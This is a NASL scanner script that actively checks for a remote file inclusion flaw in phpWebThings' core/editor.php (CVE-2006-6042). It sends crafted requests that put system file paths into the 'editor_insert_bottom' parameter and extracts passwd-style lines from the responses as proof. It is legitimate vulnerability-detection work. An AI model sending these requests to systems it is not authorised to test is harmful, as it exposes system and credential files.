# SPDX-FileCopyrightText: 2008 Justin Seitz
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80078");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2006-6042");
  script_xref(name:"OSVDB", value:"30503");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("phpWebThings RFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2008 Justin Seitz");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"phpWebThings is prone to a remote file include (RFI)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The version of phpWebThings installed on the remote host fails
  to sanitize input to the 'editor_insert_bottom' parameter before using it in the
  'core/editor.php' script to include PHP code.");

  script_tag(name:"impact", value:"Provided PHP's 'register_globals' setting is enabled, an
  unauthenticated attacker can exploit this issue to view arbitrary files and execute arbitrary
  code, possibly taken from third-party hosts, on the remote host.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://milw0rm.com/exploits/2811");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21178");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

files = traversal_files();

foreach dir (make_list_unique("/phpwebthings", "/webthings", "/phpwt", "/things", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/core/editor.php");
  if (!res || res !~ "^HTTP/1\.[01] 200")
    continue;

  foreach pattern (keys(files)) {
    file = "/" + files[pattern];

    url = dir + "/core/editor.php?editor_insert_bottom=" + file;

    req = http_get(item: url, port: port);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);
    if (!res)
      continue;

    if (egrep(pattern: pattern, string: res) ||
        string("main(", file, "): failed to open stream: No such file") >< res ||
        "open_basedir restriction in effect. File(" >< res) {
      passwd = "";

      if (egrep(pattern: pattern, string: res))
        passwd = egrep(pattern: "^[a-z_0-9$-]+:.*:[0-9]*:[0-9]*:.*:", string: res);

      if (passwd)
        report = 'It was possible to obtain the following content of the file ' + file + ' through ' +
                 http_report_vuln_url(port: port, url: url, url_only: TRUE) + ':\n\n' + passwd;
      else
        report = http_report_vuln_url(port: port, url: url);

      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
